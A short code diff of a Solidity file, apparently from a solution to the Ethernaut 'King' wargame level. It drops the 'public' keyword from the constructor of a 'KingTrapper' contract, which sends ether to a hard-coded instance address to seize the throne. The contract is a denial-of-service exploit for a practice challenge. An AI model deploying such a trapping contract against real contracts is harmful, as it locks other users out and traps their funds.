@@ -27,7 +27,7 @@ contract King {
 contract KingTrapper {
     King instance = King(payable(0x41cF6F5987db828810935789be53a99267754926));
 
-    constructor() public payable {
+    constructor() payable {
         (bool success, ) = address(instance).call{value: msg.value}("");
         require(success, "KingTrapper: Failed to transfer.");
     }
